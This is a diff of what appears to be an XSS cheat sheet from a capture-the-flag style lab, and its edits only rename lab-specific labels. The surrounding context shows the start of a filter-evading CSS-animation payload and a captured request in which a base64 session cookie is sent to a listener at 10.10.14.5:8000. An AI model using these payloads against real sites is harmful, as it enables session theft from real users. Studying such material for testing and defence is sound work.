@@ -110,7 +110,7 @@ For when `<img>` is also filtered:
 
 Modern browsers fire these in essentially the same conditions as `<img onerror>`. Pick whichever passes the app's filter.
 
-### Pattern 4 - Self-triggering animation (HTB-style)
+### Pattern 4 - Self-triggering animation (typical)
 
 ```html
 <style>@keyframes x{}</style>
@@ -228,7 +228,7 @@ GET /?c=YXV0aC1zZXNzaW9uPWVKaGJHY2lP... HTTP/1.1
 Host: 10.10.14.5:8000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64)
 Accept: */*
-Referer: http://xss.htb.net/profile?email=...
+Referer: http://xss.example.net/profile?email=...
 ```
 
 The Referer header is bonus: tells you exactly which page the XSS fired on. Useful for confirming which payload location triggered.
